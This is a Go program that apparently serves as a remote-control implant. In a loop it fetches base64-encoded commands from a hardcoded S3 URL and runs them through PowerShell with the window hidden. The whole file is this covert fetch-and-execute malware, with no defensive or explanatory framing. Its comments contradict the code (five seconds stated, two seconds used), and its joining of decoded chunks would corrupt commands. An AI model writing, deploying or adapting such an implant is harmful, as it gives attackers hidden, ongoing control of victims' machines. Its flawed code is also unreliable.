package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

func main() {
	url := "https://2ic80.s3.eu-central-1.amazonaws.com/calc.txt" // replace with your desired URL

	// Fetch the commands to run every 5 seconds
	ticker := time.NewTicker(2 * time.Second)

	for range ticker.C {
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println("Error fetching URL:", err)
			continue
		}

		// Split the commands by newline and execute them individually
		commands := make([]string, 0)
		decoder := base64.NewDecoder(base64.StdEncoding, resp.Body)
		buf := make([]byte, 1024)
		for {
			n, err := decoder.Read(buf)
			if err != nil && err != io.EOF {
				fmt.Println("Error reading response body:", err)
				break
			}
			if n == 0 {
				break
			}
			commands = append(commands, string(buf[:n]))
		}

		// Join all commands with " && "
		cmd := strings.Join(commands, " && ")

		// print the cmd
		fmt.Println(cmd)

		// Run the command in cmd
		execCmd := exec.Command("powershell", "-WindowStyle", "hidden", "-c", cmd)
		execCmd.Stdout = os.Stdout
		execCmd.Stderr = os.Stderr
		execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = execCmd.Run()
		if err != nil {
			fmt.Println("Error executing command:", err)
			continue
		}

		resp.Body.Close()
	}
}
